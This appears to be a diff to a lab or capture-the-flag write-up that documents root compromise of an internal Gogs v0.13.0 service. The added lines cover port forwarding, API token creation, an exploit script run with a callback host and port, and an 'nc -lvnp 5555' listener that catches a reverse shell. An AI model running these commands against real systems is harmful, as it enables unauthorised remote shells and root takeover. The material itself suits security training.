@@ -180,24 +180,70 @@ The service on port 3001 was identified as:
 
 - Gogs (v0.13.0)
 
-A user account and API token were created.
+After port forwarding, access to the internal Gogs instance was achieved via:
 
-Exploiting a known vulnerability allowed execution of commands as root via git hooks abuse.
 
----
+http://localhost:3001
 
-## Result
+A new user account was created and an API token was generated from:
 
-From initial web access, the following was achieved:
-
-- Container compromise  
-- Credential extraction  
-- SSH pivot to host  
-- Exploitation of internal service  
-- Full root compromise  
+Settings → Applications
 
 ---
 
+### Exploitation
+
+A public exploit script was used to abuse a vulnerability in Gogs that allows command execution via git hooks and symlink manipulation.
+
+Command used:
+
+python3 exploit.py
+-u http://localhost:3001
+
+-un test
+-pw test
+-t <API_TOKEN>
+-lh 10.10.14.125
+-lp 5555
+
+
+---
+
+### Reverse Shell Listener
+
+Before running the exploit, a listener was started:
+
+
+nc -lvnp 5555
+
+
+---
+
+### Result
+
+After running the exploit, a reverse shell was received:
+
+- Initial access inside Gogs environment
+- Escalation to root via malicious git hook execution
+
+---
+
+## Explanation of Parameters
+
+### `-t` (API Token)
+
+The `-t` parameter represents the **Gogs API token**, which is required to authenticate API requests during exploitation.
+
+---
+
+### How the token was obtained
+
+1. Logged into Gogs web interface  
+2. Navigated to: Settings → Applications
+3. Generated a new API token  
+4. Used this token in the exploit script  
+
+---
 
 
 
